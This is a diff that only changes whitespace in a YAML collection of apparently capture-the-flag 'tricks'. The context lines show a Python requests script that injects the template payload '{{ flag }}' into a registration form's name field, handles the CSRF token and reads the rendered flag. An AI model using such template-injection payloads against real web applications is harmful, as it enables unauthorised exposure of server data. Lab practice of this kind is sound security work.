@@ -26,7 +26,7 @@ tricks:
     how: "Register with name={{ flag }}, complete steps, view rendered flag"
     payload: |
       s = requests.Session()
-      
+
       # Step 1: Inject payload in name
       resp = s.get(f"{TARGET}/accounts/register/step1/")
       csrf = re.search(r'csrfmiddlewaretoken" value="([^"]+)"', resp.text).group(1)
@@ -35,8 +35,7 @@ tricks:
           "name": "{{ flag }}",
           "password": "test123456"
       })
-      
+
       # Step 2: Complete email
       # Step 3: View flag in rendered template
       resp = s.get(f"{TARGET}/accounts/register/step3/")
-
